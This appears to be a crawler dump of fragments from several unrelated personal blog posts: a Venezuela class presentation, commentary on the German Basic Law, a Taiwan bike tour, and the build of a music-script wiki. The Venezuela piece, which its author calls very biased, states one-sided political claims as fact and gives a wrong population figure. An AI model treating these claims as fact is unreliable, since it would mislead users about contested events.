won\'t be posting that often.\n'] at ['https://materialfuture.net/posts/blog/2020-01-site-redesign/']

I think the concept carries into trying many things out locally from dev tools to server side applications.'] at ['https://travisshears.com/blog/local-pijul-with-docker/']

Found CONTENT ['I recently held this presentation in my Spanish class. It has been an exercise\nin depression learning about the various ailings that have befallen this once\nso hopeful nation. The tone of this is very biased, but I found it\ncomplicated to craft a balanced picture and also project optimism in under five\nminutes. The positive spin is a lie of course — Venezuela is utterly doomed.\nAttached are the presentation PDF and some reports for further study.\nMe gustería contarle sobre Venezuela.\nYo he elegido el porque es un país con muchas facetas.\nEstá localizado en Sudamerica, entre Colombia y Brasil.\nTiene cuatros regiones: Primero, los andes, que son montañosos. Segundo, la\nregión Orinoco con el río orinoco. Tercero, la región Maraibo (y el lago\nMaracaibo, tambíen un ciudad llamado Maracaibo). En cuarto lugar, una region\nllamada Guayana venezolana, al lado del país Guyana.\nEl país tiene veintinueve mil habitantes. Se habla Castellano y lenguas\nindígenas variadas. La mayor parte de Venezuela es católico.\nLos tres ciudades más grandes en Venezuela son: Caracas con dos millones\nhabitantes, Maracaibo con un millón seiscientos mil habitantes, y Valencia con\nun millón habitantes.\nPor deporte, les gustan más el Béisbal, el Fútbol y el Baloncesto.\nPara los aficionados al fútbol aquí: El mejor club del país es el FC\nCaracas; tienen un estadio que puede contener treinta mil personas\nEl clima es muy caliente, con temperaturas entre 30 y 35 grados.\nVenezuela tiene mucha cultura, con muchas tradiciones. Se bailen, por ejemplo,\nel Joropo, el Sebucán y el baile del tambor. Esos bailes son mezclas de las\nculturas indígenas, la influencia europea y ritmos que se originaron en África.\nPero… no todo está bien.\nUn país… en crisis\nMira el índice de criminalidad: La cantidad de delitos ha aumentado\nsignificativamente. El precio del petróleo ha caído masivamente, y la calidad\ndel petróleo venezolano es mala. Hay una inflación severa, la gente no puede\ncomprar las necesidades. No hay muchos abastecimientos, porque casi no se puede\ncambiar bolívares en dólares. Los suministros médicos son malos; los\nhospitales no tienen todos los medicamentos necesarios.\nComo puede ver, hay problemas. Simple, ¿verdad?\nQuien son las manifestantes? Qué quiere la oposición?\nLos manifestantes no son hippies que están dando flores a la policía. Están\nprotestando, si, pero los líderes más fuertes de la oposición consiste en\nnarcotraficantes, paramilitares y contratistas militares privados. Ha habido\nasesinatos políticos en jueces, estudiantes y organizadores comunitarios. La\nmitad de los muertos fueron muertos por la oposición. \nMaría Machado, una de los líderes de la oposición, estaba diciendo este abril:\n\n“La meta no es hacer elecciones en el marco del régimen criminal de Maduro.\n[…] El primer paso es deponer al régimen.”\n\nHabía una presentación sobre Colombia hace unas pocas semanas: Es un país muy\nalegre y hermoso, pero también hay mucha violencia. No solo a causa de los\nnarcotraficantes, principalmente debido a la guerra del gobierno derechista\nbajo Álvaro Uribe con los FARC.\nLos FARC-EP luchan por la tierra para cultivar en, por la medicina, y por su\ndignidad, porque el gobierno no los reconoce a sus derechos.  Las fuerzas de\nseguridad de Colombia, con paramilitares, han ejecutado a más de 4000\nciviles (civiles, sin contar guerrillas) durante el reinado del Uribe. Esa\npuede ser la razón de los militares venezolanos para apoyar Maduro y el Partido\nSocialista Unido de Venezuela.\nLas políticas de la oposición quieren prohibir los sindicatos, privatizar todo,\ndisparar a cientos de miles de personas y reducir aún más el gasto en salud y educación.\nQuizás… podría haber una guerra con Guyana sobre disputas territoriales, como\nla “Guerra de las Malvinas” entre Argentina y Gran Bretaña.\nY puede ser aún peor: Un montón de gente todavía recuerda los años de\natrocidades en toda América del Sur.\nPor esos razones, la gente de Venezuela tiene miedo de lo que podría suceder si\nfalla Nicolás Maduro. Más o menos un tercio de la población son chavistas y un\ntercio son derechistas. El último tercio no apoya al gobierno sino que también\nsospecha de la oposición.\nUn país… con esperanza\nPero hay esperanza:\nVenezuela tiene buenas relacionas con sus vecinos, el comercio es bien, hay\nestrecha cooperación con Cuba y Ecuador. Venezuela no es una república bananera.\nHabrá una asamblea constituyente el 30 de julio, hay una esperanza real de\ncambio y reformas. El tiempo dirá cómo se resolverá esta crisis. A pesar de la\ncontinua violencia y agitación, Venezuela sigue siendo uno de los países más\nfelices del mundo.\n¡Gracias por la atención!\nAddendum\n\nPresentation PDF\nWhy is Venezuela in Crisis?\n  by Gabriel Hetland. A sober look at what’s happening from 2016 that still\n  holds true\nThe four proven War Crimes that have Uribe against the Wall\n'] at ['https://ix5.org/thoughts/2017/venezuela-presentation/']

Invite an advocate for the law and order of Mussolini’s Neo-Roman empire?\n“Promoting a system that seeks to overthrow the constitutional order”. This is\na powerful and underestimated paragraph. When there is no way to go after an\nindividual, seeking to tarnish the image of their association is a lot easier.\nParagraph 3 states:\n\nThe right to form associations for the purpose of keeping and fostering the\nworking and economical conditions is guaranteed for everyone and all\nprofessions. Agreements that seek to restrict or impede this right are\nvoid, measures aimed at this are illegal.\nMeasures in accordance with articles 12 a, 35 paragraph 2 and 3, Article 87 a\nparagraph 4 and Article 91 can not be directed against labour struggles which\nare conducted by associations for the purpose of keeping and fostering the\nlabour and economical conditions in the spirit of paragraph 1.\n\nThe word that is implied but not explicitly stated is union. A contract that\nrestricts workers’ rights to form unions is void, working to undermine that\nright is against the law. Reading this one strictly, there is basis to throw\nunion busters into prison, even for the intent.\nThe second part, added in 1968, was introduced as a compromise to the strong\nprotests against the German state’s resurgence of military might and out of\nfear for the dangers of unrestrained capitalism.\nIn conclusion, the labour union was recognized as a strong tool to introduce\nand foster democratic thinking not only every four years at the urns, but\nalso every day at the workplace. They still form the backbone of every\ndemocratic socialist movement, and to ignore their voice even in the face of\ndeclining membership is to throw away elections.\nThe same article that sought to protect unions above a lot of other things also\nplaced strong tools into the hands of union busters who would argue, sometimes\nrightfully, that the all too close friendship and mutual understanding between\nlabour unions and the eastern bloc sought to introduce a socialist order to the\nyoung German state.\nWhile socialist ideas do not have to endorse communism, those days, who could\ntell the difference?'] at ['https://ix5.org/thoughts/2017/grundgesetz-article-9/']

The police must protect the assembly and the\nexpected parties from one another, exhausting all reasonably available\nmanpower. Only if public order cannot be guaranteed even with a heavy police\npresence, measures may be taken to alter the event.\nIn conclusion, even if a whole town is opposed to the appearance of someone, \ntheir appearance, at least indoors, but often also outdoors, cannot be\nprevented legally.\nThis leads to all sorts of delicate tiptoeing when there are efforts to\nsuppress an undesirable appearance of someone. Public halls suddenly have to\nclose for ‘renovations’, bus service from the train station is regrettably out\nof service, the projection screen on which the Turkish prime minister is slated\nto appear poses a ‘security’ risk on account of being too large, you get the\ngist of it.\nAs with free speech laws, this is a delicate balancing act between public\ninterest and individual freedom. The author would rather have the community\ncome together to find innovative ways to curb annoyances than have laws which\nwould end up being only selectively enforced to silence dissent.'] at ['https://ix5.org/thoughts/2017/grundgesetz-article-8/']

Die Genehmigung ist zu\n   erteilen, wenn die privaten Schulen in ihren Lehrzielen und Einrichtungen\n   sowie in der wissenschaftlichen Ausbildung ihrer Lehrkräfte nicht hinter\n   den öffentlichen Schulen zurückstehen und eine Sonderung der Schüler nach\n   Besitzverhältnissen der Eltern nicht gefördert wird. Die Genehmigung ist\n   zu versagen, wenn die wirtschaftliche und rechtliche Stellung der\n   Lehrkräfte nicht genügend gesichert ist.\nEine private Volksschule ist nur zuzulassen, wenn die\n   Unterrichtsverwaltung ein besonderes pädagogisches Interesse anerkennt\n   oder, auf Antrag von Erziehungsberechtigen, wenn sie als\n   Gemeinschaftsschule, als Bekenntnis- oder Weltanschauungsschule errichtet\n   werden soll und eine öffentliche Volksschule dieser Art in der Gemeinde\n   nicht besteht.\nVorschulen bleiben aufgehoben.\n\n\nLet us dissect and translate this article by paragraph.\nParagraph 1 states:\n\nThe whole of the school system is under the supervision of the state.\n\nThe states govern most of school matters. The federal government mostly dishes\nout funding for big glossy initiatives while state legislators are free to\nshape the education in their state. This leads to the final exams, the\n‘Abitur’, being much harder in Bavaria than in Mecklenburg-Vorpommern.\nParagraph 2 states:\n\nThe legal guardians have the right to decide over the participation of the\nchild in religion class.\n\nLetting the child himself decide would have been too much of a reduction of the\nparents’ authority over their children.\nParagraph 3 states:\n\nReligion class is a proper school subject in public schools, with exception\nof the non-denominational schools. Regardless of the state’s right to\nsupervision, religions class will be taught in accordance with the tenets of\nthe religious communities.\nNo teacher may be compelled to give religion class against his will.\n\nDue to several murky manifestations of the close intertwining of the Christian\nchurches and the German state, teachers may very well be compelled, if not\nforced, to join and teach at religious schools. Because church law takes\nprecedence over labour law, employees of the church even have to live their\nprivate lives in accordance with morality laws. This may lead to a teacher at a\npublicly funded denominational school to be let go over the cardinal sin of\nseparating from their abusive husband.\nMore on the separation of church and state in a later article.\nParagraph 4 states:\n\nThe right to erect private schools is guaranteed. Private schools, as a\nsubstitute for public schools, need the permission of the state and are\ngoverned by state laws. Permission is to be granted when private schools are\nnot lagging behind public schools in matters of learning goals and\ntheir institutions as well as the scientific education of the teaching\npersonnel, and if a segregation of the pupils by parent income is not\nencouraged.  Permission is to be refused if the economic and legal standing\nof teaching personnel is not sufficiently guaranteed.\n\nParagraph 5 states:\n\nA private elementary school is only to be permitted if the school\nadministration recognizes a special pedagogic interest, or if it, with the\nlegal guardians’ initiative, is to be erected as a denominational or\nideological school and a public school of that kind does not already exist in\nthe area.\n\nParagraph 6 states:\n\nPreschools stay abolished.\n\nParents of course are still free to send their children to\nMandarin-as-a-second-language-, my-kid-plays-the-violin- kind of preparatory\nkindergardens and private quasi-preschools to give them that crucial\ncompetitive edge over the other toddlers. This paragraph only confirms the\nabolishment of mandatory preschools.\nIn conclusion, the parents’ right to instill their belief system’s values into\ntheir offspring not only at home, but also at school, is upheld.'] at ['https://ix5.org/thoughts/2017/grundgesetz-article-7/']

Eine\n   Zensur findet nicht statt.\nDiese Rechte finden ihre Schranken in den Vorschriften der allgemeinen\n   Gesetze, den gesetzlichen Bestimmungen zum Schutze der Jugend und in dem\n   Recht der persönlichen Ehre.\nKunst und Wissenschaft, Forschung und Lehre sind frei. Die Freiheit der\n   Lehre entbindet nicht von der Treue zur Verfassung.\n\n\nLet us dissect and translate this article by paragraph.\nParagraph 1 states:\n\nEveryone has the right to express and disseminate his opinion in speech,\nwriting and picture, as well as to educate himself from publicly available\nsources without hindrance. The freedom of the press and the freedom of\nreporting through radio and film is being guaranteed. A censorship does not\ntake place.\n\nHaving an opinion means assessing a fact, it is the result of a thought process.\nCompound statements of opinion and factual assertions are protected as well,\neven if the assertion may be proven false, because the compound statement may\nbe aiding in the formation of an opinion.\nIn addition to individuals, this paragraph also protects publishers and\neditors. Unimpaired access to information is ensured, which is interesting:\nInternet access already enjoys status as a basic right, as declared by the\nBundesgerichtshof in 2013. After all, information on the internet still\nconsists of word, picture and sound.\nForcing an opinion on someone is not protected by this article. Just as there\nexists a freedom to disseminate an opinion, there exists the right to choose to\nignore it.\nParagraph 2 states:\n\nThese rights find their barriers in the provisions of the general laws and\nregulations, statutory provisions for the protection of the youth and the\nright of personal honour.\n\nVery important to note, Article 5 is not a magic protection spell to absolve\none from a lack of decency or responsibility. It leaves room for strong\nprovisions in the penal code.\nGermany has comparatively weak libel laws and provides strong backing for\nsatire and criticism. The Landesmedienanstalten however are zealous in their\nquests to protect German youth from harm, including depictions of violence and\nindecency.  Featuring insignia of the Third Reich is only allowed in a\nnon-glorifying context.\nFreedom of speech in the Federal Republic of Germany is effectively governed by \nseveral laws and bodies.\n\nArticle 5 makes freedom of opinion, of the press and of reporting, and\n  freedom from censorship constitutional principles.\nProtection of the free and democratic basic order mandates the prohibition of\n  the following: Volksverhetzung, Glorification of National Socialism, use of\n  symbols of the reign of National Socialism, and denial of the Shoah.\nArticle 2 ensures personal rights are strongly protected. Slander and\n  defamation encroach upon these rights. The right to privacy is strongly\n  protected. Personal data may be broadcast or sold only with strong reservations.\nArticle 3 ensures freedom from discrimination, advocating a position\n  irreconcilable with that principle is not protected.\nSecurity laws forbid treason.\nProtection of the youth is governed by the Youth Protection Act and the\n  Jugendmedien-Staatsvertrag.\nDecency and religious freedom laws. Germany has been a republic for some time\n  now, that does not stop us from having Lèse majesté laws, just for foreign\n  rulers. One must be cautious of hurt feelings, especially if the subject is\n  well connected.\nEndorsement of criminal actions is forbidden per the penal code.\nThe copyright to Mein Kampf was held by the Free State of Bavaria\n  until 2016. Owing to numerous trade deals, there is strong copyright\n  protection in Germany.\n\nAll these factors mean that while Germany enjoys a vibrant and free press\nlandscape, certain items are off limits:\nOne could, for example, call Donald Rumsfeld a lizard in jest, but calling him\na lizard based on the claim that all persons of U.S. American heritage are\nlizards out to consume human flesh would be indictable, as that would\nconstitute Volksverhetzung per Chapter 7 § 130 of the penal code.\nDenying something that happened in the antique is permissible, as sources are\nnot entirely verifiable. The events of the Third Reich however are not to be\ndisputed, as the constitution hinges on preventing them from ever befalling the\nworld again. We’ll get to how this is translated into the education system later.\nParagraph 3 states:\n\nArt and science, research and teaching are free. The freedom of academic\nteaching does not release one from loyalty to the constitution.\n\nLoyalty to the constitution does not mean a scientific complaint against the\nconstitution may not be leveled. Teaching of course is bound by curriculum,\nwhich is set by the federal states.\nIn conclusion, this article, often misinterpreted, ensures public life and\ncommunication may develop in peace and bloom. Not only distribution of, but\nalso access to information is protected.\nAddendum\nNormally, the biggest issue with freedom of speech are lies told about\nsomeone. Yet in Germany it is not permissible to lie about something that\nhappened. The state has a monopoly on what constitutes a falsehood, on what\nis true and what is not.\nAdding to that, the state of independence of the regulatory bodies from the\ngovernment is somewhat murky; the ranks of the Rundfunkrat are littered with\nparty functionaries.\nIn practice only useless knuckleheads dispute events of the past that are\nprovably true. The German state provides a sense of calm for the German people\nas they do not have to tolerate blatant and malicious lies and can prosecute\nneo-fascist Pied Pipers with solid legal standing.\nBut also instills a sense of unease. It just does not feel right. Having to\nfight for temporary injunctions against virulent degenerates as is practice in\nother countries, as laborious as it is, is preferable to codifying state power\nover the truth into law. The current state of affairs keeps people honest, at\na cost, with mighty force, not persuasion.'] at ['https://ix5.org/thoughts/2017/grundgesetz-article-5/']

The drafters, who\nmust have been mostly of judeo-christian denomination, took even the fringes of\nsociety into their consideration.\nThey could have relied on the implicit monopoly on power of their like-minded\npeers1, yet they put explicit clauses limiting that power\ninto the law, including strong separation of church and state.\nParagraph 2 states:\n\nThe undisturbed practice of religion is being guaranteed.\n\nNot only faith itself is being protected, but also practicing what one believes\nin. Erection of places of worship and the bounds of freedom of religion,\nincluding the extent to which one may force their child to observe a religious\nlifestyle are codified in subsequent articles.\nParagraph 3 states:\n\nNo one may be compelled to serve at arms against his conscience. A federal\nlaw governs the particulars.\n\nThis one is fairly obvious, given that a previous ban on German rearmament had\nfailed. Prohibiting conscription is a simple deterrent. The case of a\nSpannungsfall or Verteidigungsfall is governed by another article.\nIn conclusion, the article finally translates the phrase “Die Gedanken sind\nfrei” into law and sets the groundwork for allowing people to not only believe\nwhat they choose to, but also to practice their faith openly.\nThe commitment to freedom of ideology is astonishing, given that the cold war\nwas heating up by the minute and the “threat of communism” was awarded a\ndisproportionately high credibility. Perhaps it was assumed communist\nsubversion would be treated as treason and not categorized as a “worldview-ly\ndenomination“(literal translation), thus obviating any qualification of the law\nto only include social capitalism as allowed.\n\n\n\n\nChristian democrats had wielded near absolute power for years,\n            both on politics and on morals ↩\n\n\n'] at ['https://ix5.org/thoughts/2017/grundgesetz-article-4/']

The state promotes the actual enforcement\nof the equality of men and women and works to eradicate existing disadvantages.\n\nEradicating existing injustices often involves creating a temporary state of\nother unjustness, swaying towards the other direction to counter a dangerous\nexisting lean. Whether affirmative action can be construed from this is dubious.\nParagraph 3 states:\n\nNo one may be disadvantaged or favoured based on his gender, his heritage,\nhis race, his language, his home and origin, his faith, his religious or\npolitical convictions. No one may be disadvantaged because of his disability.\n\nA very abstract one. Again, high aspirations that are difficult to implement.\nThis paragraph seems toothless as a piece of law, as it is bound to be pierced\nby subsequent articles on freedom of choice, freedom of religion, asylum law,\nand the factor that while the law may be blind, people are not.

Not liberty, but human dignity is the greatest good.\nA piece of semantics: We’ll get to international law(‘Völkerrecht’) later,\nbut “crimes against humanity” is not translated “Verbrechen gegen die\nMenschlichkeit”, but rather “gegen die Menschheit”.  Critics such as Hannah\nArendth rightfully bemoan the degradation of the powerful language of “crimes\nagainst humanity itself” in the German version as “crimes against\nhumaneness”; as if only proper etiquette was violated.\nParagraph 2 states:\n\nThe German people thus profess the infrangible and inalienable nature of\nhuman rights as basis of any human community, of peace, and of justice in\nthe world.\n\nThe infrangibility and inalienability has limits in special circumstances, as\nlaid out in art. 17a through 19 and art. 104, among others.

Found CONTENT ['It’s been a while since I finished this tour, but I still haven’t found\ntime to write down the exact whereabouts, personal recommendations as\nwell as most of my travel experiences.\n\n\nAlthough the flight with Air China was booked way in advance, I still\ndid not really know what I was getting myself into. Stepping out of the\nairport, the heat hit me and I was impressed by the politeness that I\nsaw around me.\nThe first days after arrival I stayed in TaiwanMex in Taipei, bought a\nLonely Planet and visited the sights of the city. Apart from the\nobligatory Taipei 101 and Chiang-Kai-Shek Memorial Hall, I stopped often\nand took a look at many of the curiosities the city had to offer.\nSun-Yat-Sen Memorial Hall is quite nice at nighttime and lots of people\ngather for breakdance performances at the entrance to the building.\nAfter I had found a bike shop willing to rent me a 2000$ bike for 5€ a\nday(get out at MRT stop Quilian, take exit 1 and after about 200m of\nwalking on the road to the left of the metro, you should be able to see\na carwash, continue and after a few meters you will find a small bike\nshop), I packed up and started riding. My first stop was the harbour\ncity Keelung north-east of Taipei. The roads were congested and the heat\nmade everyone nervous. I was so relieved to finally see the waves and\nfollowed the coastline to Fulong beach.\nAlong the way, I met many friendly cyclists from all over Asia, who\nfollowed the same route as me.\nI slept at a small surf shack in Ciayi and took a surfing lesson the\nnext day. The waves were ideal and everybody had a great time. You could\nalready tell a typhoon was coming though.\nAfter a night at a bar in Yilan I took my bike on the train to\nHualien(Xin Zen). You should have somebody arrange it in advance for you\nor you might run into a conductor giving you trouble.\nFrom there on my trusty bike had to endury the steep climbs of Taroko\nGorge National Park. The first night was spent in Tianshiang at the\nCatholic Youth hostel. Not a single word of English was spoken, but\nluckily some friendly Malaysian guests there to save the day for all\nunsuspecting western travellers.\nThere is a beautiful trail called Luishui-Wenshan-trail near\nTianshiang, crossing abandoned old bridges and going up and down the\nmountains. At this time of the year I had the trail all to myself.\nBe sure to apply for a mountain permit beforehand.\nThe hot springs at the end are very convenient and I found them to be\nmuch more relaxing than the ones I found near Puli later on.\nAfter getting some rest, I spent the next day struggling partly with the\nmountains, but mainly the worsening weather. Car drivers kept\ntelling the storm was going to hit much earlier than expected.\nThe rain kept getting stronger and I was glad to finally arrive in\nGuanyun, having covered around 2000m of elevation and about 60km of\nserpentine after serpentine.\nBack on the road after the typhoon, the streets were not as devastated\nas I would have expected them to be. The roadworkers, many of which came\nto the police station, the only building to have electricity and access\nto running water, did a great job during the night.\nThe last bit to the top of Highway 14 is just excruciating, in turn the\ndescent is even more rewarding. The night was spent in Puli Guest House,\nthe owner, a Japanese expatriate, was quite helpful in planning the next\nsteps of my journey.\nSun-Moon-Lake kind of failed to impress me, so I continued without\nstaying there too long. Lukang was nice, but the rest of Changhua couny\nand around just seemed boring and the infrastructure seemed to consist\nof long strips of indistinguishable roads and car shops.\nThe bus back to Taipei was on time, comfortable, allowed me to take my\nbike without a hassle, arrived quickly and made me wonder why\ntransportation at home still does not work that seamless at all.\nAfter returning the bike, getting some chores done and exploring Taipei,\na bus took me to Kaohsiung and the night was spent at the interesting,\nalbeit slightly touristy nightmarket.\nTo be continued.'] at ['https://ix5.org/thoughts/2014/2014-taiwan-bike-tour-travel-report/']

Found CONTENT ['Overview\n\n\n\nThis is a visual account of building https://norns.community. It is divded into 4 sections:\n\n\n  Overview\n  The Design Challenge\n  A Solution\n  Conclusion\n\n\nMost of the work was done in the month of March. Principal contributors were myself, Jordan / @eigen, and Dan / @dan_derks. (Meta: dang, that feels good to actually link to it!) As usual, the project saw plenty of collaboration from dozens of members of the monome community.\n\nI’m really proud of the work we did, how quickly we did it, and how we much fun I had working together.\n\n(Click any image to zoom in.)\n\n\n\nThe Design Challenge\n\nllllllll.co (read: lines) is an electronic music forum. Among many other things, lines is the primary destination for norns script authors to share their work and norns owners to find new scripts. The site runs on Discourse, is very well moderated, and has been a bastion of joy for me during the pandemic. Threads with new comments float to the top of the list and there are plenty of category and tag features built in:\n\n\n\n\n\n\n\n\n\nThe Discourse platform was designed for nurturing communities and having engaging discussions. Scripts, however, are essentially “products” that you have to “shop” for. (Even though all the scripts are open source and free, you still have to find the script, figure out if it is something you’re interested in, make the decision to install it, learn how to use it, etc.) This requires a whole new set of features that go beyond what Discourse was designed to do:\n\n\n  As a norns owner I need a way to explore new scripts.\n  As a norns owner I need support using the software.\n  As a script author I need a place to document potentially large amounts of technical data.\n  As a script author I need to spread awareness (market) my script.\n\n\nNaturally, people started using Discourse to address these needs. Personally, I was particuarly unhappy with the experience of documenting my scripts. One of my early solutions for the issue was to host my docs out on GitHub Pages. Another solution, like Dan did with Cheat Codes, was to make a downloadable PDF. Both tasks require a relatively high degree of patience, passion, and technical proficiency.\n\n\n  How might we make it easy for script authors to document their work?\n  How might we make an “app store” experience for norns scripts?\n  How might we get the community buy-in needed for adoption?\n\n\nThe experiencing of finding new scripts is hit or miss. New scripts that have a lot of activity are typically top of mind since they are surfaced by Discourse. But what about older scripts? With some patience you can get to them, but it requires a lot of searching and reading. Discourse is “text first” - you can’t see images while browsing threads. This made “shopping” for scripts something of a guessing game. Click on a thread, maybe get lucky?\n\nFurthermore, while the forum is very well moderated, there is no enforced information architecture (IA). Thread titles can be whatever. Script descriptions might be just a screenshot, or just some text, or a video…\n\n\n\nA Solution\n\nI call this section “A Solution” becuase there are always many ways to solve a challenge!\n\nBrian / @tehn and Dan identified wiki.js as a solution. A wiki fit the open source and community spirit. Moving the content outisde of Discourse would free us up to make new design decisions. While they got to work setting up the server and configuring the platform, I started thinking about what an MVP might look like and getting to work on the IA.\n\nInformation Architecture\n\nMy heuristics:\n\n\n  Keep it DRY.\n  Keep it orthagonal.\n  Keep tags to a minimum.\n\n\n\n\n\n\n\n\n\n\nThe Gallery Integration\n\nJordan had already put in a ton of work on a custom script gallery as an evolution of the awesome monome norns project. He dove into learning the wiki.js GraphQL and was able to get all the scripts dynamically pulled in. This means authors only have to add thier correctly-tagged script page and the tech will do everything else for them. I applied CSS styling to match the rest of the site for a seamless experience. There was lots of fun technical challenges with this part of the project, but that’s a whole separate blog post.\n\nThere are four different flavors of gallery.\n\n\n  View All Scripts\n  View One Author’s Scripts\n  View One Category\n  View Some Number of Random Scripts\n\n\nWe implemented all this with an iframe and a GET parameter.\n\n<!-- all -->\n<iframe\n  src="https://p3r7.github.io/norns-gallery-render"\n  id="gallery-iframe">\n</iframe>\n\n<!-- author -->\n<iframe\n  src="https://p3r7.github.io/norns-gallery-render/?author=northern-information"\n  id="gallery-iframe">\n</iframe>\n\n<!-- category -->\n<iframe\n  src="https://p3r7.github.io/norns-gallery-render/?script-category=art"\n  id="gallery-iframe">\n</iframe>\n\n<!-- random -->\n<iframe\n  src="https://p3r7.github.io/norns-gallery-render/?random=4"\n  id="gallery-iframe">\n</iframe>\n\n\n\n\n\n\n\n\n\n\n\nDesign\n\nI actually didn’t start with a wireframe.\n\nWhy?\n\nI needed to learn the limitations of wiki.js first. I didn’t want to design a layout that would be technically difficult to execute. Defaults are beautiful and wiki.js’s default design sensibilities are quite reasonable.\n\nwiki.js doesn’t support custom themes but it does allow you to inject CSS and JS. I tried to keep this as minimal as possible. There’s maybe CSS 10 delcarations total. Most of them just changing colors or hiding elements.\n\nI was sure to add some fun stuff in, too. The login page features a technical schematic of the norns and the favicon is an abstracted norns. (Sorry shield crew.)\n\n\n\n\n\n\n\n\n\n\n\n\n\nUser Experience\n\nThere are two main persona’s of the site. Script authors needed a detailed set of instructions so we setup a page with plenty of screenshots, explanations, and templates.\n\nFor non-authors, however, the key was actulaly subtraction. I made sure to keep the navigation as flat as possible. We made the decision to disable comments as Discourse is already great for that.\n\nDan setup authentication to work with both GitHub and Discord so people didn’t have to make yet another account. Authors login with GitHub accounts. We know authors already have these becuase they are a pre-requisite to getting their work published in maiden, the script catalog. Editors need a Discord account and to be in the norns study group. The thinking here is this social proof would afford us some degree of resilience against vandalism.\n\nwiki.js allows you to connect permission levels with the type of authentication. So authors can edit their “author” pages, but editors cannot, etc. It was a beautiful, clean solution.\n\n\n\n\n\n\n\nConclusion\n\nThis was a really fun project to be a part of. Once we were reasonably certain with the author instructions we started inviting script authors to add their work. For the experience to be a success for non-authors, there needed to be a critical mass of scripts on day one. As of go live we have about 80 which is a resounding success. I’ve already discovered new scripts!\n\nA special shout out to Jordan - working with him was an absolute joy. He was measured, pragmatic, selfless, and gave me lots of help as I learned how ClojureScript worked.\n\nI hope you enjoy using norns.community as much as I enjoyed making it. My hope is for this community nurtured wiki to become the defacto place to learn about all of the amazing scripts out there.'] at ['https://nor.the-rn.info/2021/04/09/building-norns-community/']

In his acceptance speech for the 1972 Nobel Prize in Chemistry, Christian Anfinsen postulated that a protein’s amino acid sequence should fully determine its structure. This hypothesis sparked a five decade quest to be able to computationally predict a protein’s physical structure based solely on its amino acid sequence. DeepMind trained its system on publicly available data consisting of tens of thousands of protein structures from the protein data bank together with large databases containing protein sequences of unknown structure. By iterating this process, the system develops strong predictions of the underlying physical structure of the protein and is able to determine highly-accurate structures in a matter of days. Being able to know the structure of every protein the human body can produce should allow us to determine which molecules would be good candidate drugs. It will also allow us to map the structures of new virus proteins or to understand ageing at a cellular level.\n\n  The breakthrough was remarkable not just because of its predictable impact on biomedicine and health, but also because it shows, perhaps for the first time, what machine learning can truly achieve. As Eli Dourado noted, most applications of machine learning so far are essentially toys. Protein folding is the real deal, superhuman machine intelligence in the service of world-transforming technology.

Mancuso — who spent time at Millbrook with Leary and talked about using immersive sound equipment to achieve the feelings he got listening to birds or flowing water — was Italian, and his loft parties were mixed in terms of color, identity, and sexual preference. Many great DJs of color came up through these fetes, including the extraordinary innovators Larry Levan (Paradise Garage) and Frankie Knuckles (Chicago’s Warehouse), who pushed the form far beyond Mancuso, and hard into the future.\n\n\n\n\nI’m on gemini.'] at ['https://nor.the-rn.info/2021/03/20/rounding-errors/']

Found CONTENT ['I’m live streaming the making of my next album on Twitch.\n\n\n\nSome streams will be focused on sound design. We’ll listen to the same loop over and over again while I finely adjust various sonic parameters.\n\nOther streams will be focused on synthesis. We’ll take the primordial elements of sine waves and white noise and build them up to richer, more complex waveforms.\n\nYet other streams will be focused on jamming/writing. These will will serve as mini concerts but are practically guaranteed to include spectacular mistakes. Sour notes, mis-synced beats, system crashes, all of it.\n\n\n\nI’ve produced a lot of music. The releases I’m proudest of tend to have some some number of unique aspects: a new instrument, a dream, a new apartment, a breakup… one of these aspects that I’ve only recently become aware of is the notion of “just enough experimentation”. When there is too much experimentation, the scientific method dissolves, there are no controls, and the work ends up unfocused and incoherent. When there is not enough experimentation, the work is just boring.\n\nThis is a spectacularly public experiment. I’m only a week into the project but it has already completely warped my process and I love it.\n\n\n  Folks drop in chat and have ideas to steer the direction of the music.\n  I’m working faster because I know people are watching.\n  I’m working more consistently because I want to stream every night.\n  I’m having more fun writing because I’m hyper aware of “dead air” time, so I queue up little ambient loops while I work on tasks that typically wouldn’t generate sound.\n  The whole project is being publicly performed and archived.\n\n\nYet I don’t think this is “too much” experimentation at all. In an age of content, it feels really nice to turn the whole thing inside out and welcome the world along the journey with me. And why shouldn’t this be interesting?

But, alas, it would be unfair to my future self to not document my lived experience while inhabiting this particular fold of temporality.\n\n\n\nOne thought I cannot shake: things are going to get objectively worse, for a long while, before they get objectively better. Just today:\n\n\n  World Health Organization experts have warned that even though the coronavirus pandemic has been very severe, it is “not necessarily the big one”, and that the world will have to learn to live with Covid-19.\n\n  The “destiny” of the virus is to become endemic, even as vaccines begin to be rolled out in the US and UK, says Professor David Heymann, the chair of the WHO’s strategic and technical advisory group for infectious hazards.\n\n  “The world has hoped for herd immunity. […] It appears the destiny of SARS-CoV-2 [Covid-19] is to become endemic, as have four other human coronaviruses, and that it will continue to mutate as it reproduces in human cells, especially in areas of more intense admission. […]”\n\n\n\n\n\n\nDespite a record high number of sleepless nights, “Is this real life?” moments, and other existentia, this year was a creative renaissance for me. I haven’t had a year like this since that golden summer of 2009 when Endless Field Studios burst onto the scene.\n\nThis year, I got involved with the monome community. Learned Lua. Started learning modular. Made dronecaster, arcologies, Yggdrasil, and other scripts. I wrote and released the first Northern Information (sans “movement”) album. I mobilized The First Arclogists. I made lots of videos, conducted workshops, contributed to podcasts, and gave talks.\n\nI read a lot of books and discovered a ton of new music.\n\nWe successfully navigated Highland through what was perhaps the company’s most complex season in its 21 year history.\n\nI moved to California.\n\n\n\n\n\nThe most unexpected phenomenon of this time is how many new friends I’ve made. The norns study group has been a true joy and source of geniune connection and learning.\n\nOn NYE we shall celebrate with the 4th Lines Community Stream.\n\n\n\n\n\n\n\nThese images of plants are screenshots from my last script of the year. It cycles through the seasons, playing generative music.

